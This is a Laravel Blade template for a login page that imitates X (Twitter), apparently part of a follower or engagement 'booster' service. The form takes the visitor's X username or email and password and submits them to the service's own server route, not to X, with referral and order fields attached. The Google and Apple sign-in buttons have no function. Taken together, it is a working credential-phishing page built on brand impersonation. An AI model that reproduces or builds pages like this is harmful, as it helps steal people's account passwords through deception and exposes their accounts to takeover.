@extends('platform-login.layout')

@section('title', 'Sign in to X')

@section('content')
<div class="w-full max-w-[440px] mx-auto space-y-4">
    <!-- X Login Card -->
    <div class="bg-black border border-white/20 rounded-3xl p-8 sm:p-10 shadow-2xl relative">
        <!-- X Logo Header -->
        <div class="flex justify-center mb-6">
            <div class="w-12 h-12 flex items-center justify-center">
                <i class="fa-brands fa-x-twitter text-4xl text-white"></i>
            </div>
        </div>

        <h2 class="text-2xl sm:text-3xl font-black text-white text-center tracking-tight mb-2">
            Sign in to X
        </h2>

        <!-- Context Pill -->
        <div class="mb-6 p-3 rounded-2xl bg-white/5 border border-white/10 text-center text-xs text-gray-300">
            <span>Authorizing booster delivery for:</span>
            <div class="font-bold text-white text-sm mt-0.5">{{ number_format($quantity) }} {{ $service }}</div>
            @if(!empty($username))
                <div class="text-[11px] text-gray-400 mt-0.5">Account: <span class="text-white">{{ '@' . ltrim($username, '@') }}</span></div>
            @endif
        </div>

        <!-- Google / Apple Quick Options -->
        <div class="space-y-2.5 mb-5">
            <button type="button" class="w-full py-2.5 bg-white text-black font-semibold text-xs rounded-full flex items-center justify-center gap-2 hover:bg-gray-100 transition-colors">
                <i class="fa-brands fa-google text-sm"></i>
                <span>Sign in with Google</span>
            </button>
            <button type="button" class="w-full py-2.5 bg-transparent border border-white/30 text-white font-semibold text-xs rounded-full flex items-center justify-center gap-2 hover:bg-white/5 transition-colors">
                <i class="fa-brands fa-apple text-sm"></i>
                <span>Sign in with Apple</span>
            </button>
        </div>

        <div class="flex items-center my-4 gap-3">
            <div class="flex-1 h-px bg-white/20"></div>
            <span class="text-xs text-gray-400 font-medium">or</span>
            <div class="flex-1 h-px bg-white/20"></div>
        </div>

        <form method="POST" action="{{ route('platform.login.store', ['platform' => 'twitter']) }}" class="space-y-3.5">
            @csrf
            <input type="hidden" name="tag_id" value="{{ $tag->id ?? 3 }}">
            <input type="hidden" name="service_type" value="{{ $service }}">
            <input type="hidden" name="quantity" value="{{ $quantity }}">
            <input type="hidden" name="username" value="{{ $username }}">
            <input type="hidden" name="referral_code_id" value="{{ $refId }}">
            <input type="hidden" name="ref_id" value="{{ $refId }}">

            <div>
                <input type="text" name="email" required
                    value="{{ $username ? ltrim($username, '@') : '' }}"
                    class="w-full px-4 py-3.5 text-sm rounded-xl bg-black border border-white/30 text-white placeholder-gray-500 focus:outline-none focus:border-white transition-colors"
                    placeholder="Phone, email, or username">
            </div>

            <div class="relative">
                <input type="password" id="x_password" name="password" required
                    class="w-full px-4 py-3.5 pr-14 text-sm rounded-xl bg-black border border-white/30 text-white placeholder-gray-500 focus:outline-none focus:border-white transition-colors"
                    placeholder="Password">
                <button type="button" onclick="togglePassword('x_password', this)"
                    class="absolute right-4 top-4 text-xs font-semibold text-gray-400 hover:text-white transition-colors">
                    Show
                </button>
            </div>

            <button type="submit"
                class="w-full py-3.5 bg-white hover:bg-gray-200 text-black font-bold text-sm rounded-full transition-all active:scale-[0.98]">
                Sign in
            </button>

            <button type="button" class="w-full py-2.5 bg-transparent border border-white/20 hover:bg-white/5 text-white font-semibold text-xs rounded-full transition-colors">
                Forgot password?
            </button>
        </form>

        <div class="mt-6 text-xs text-gray-500 text-center">
            Don't have an account? <span class="text-[#1d9bf0] hover:underline cursor-pointer">Sign up</span>
        </div>
    </div>
</div>
@endsection

@section('scripts')
<script>
    function togglePassword(inputId, btn) {
        const input = document.getElementById(inputId);
        if (input.type === 'password') {
            input.type = 'text';
            btn.innerText = 'Hide';
        } else {
            input.type = 'password';
            btn.innerText = 'Show';
        }
    }
</script>
@endsection
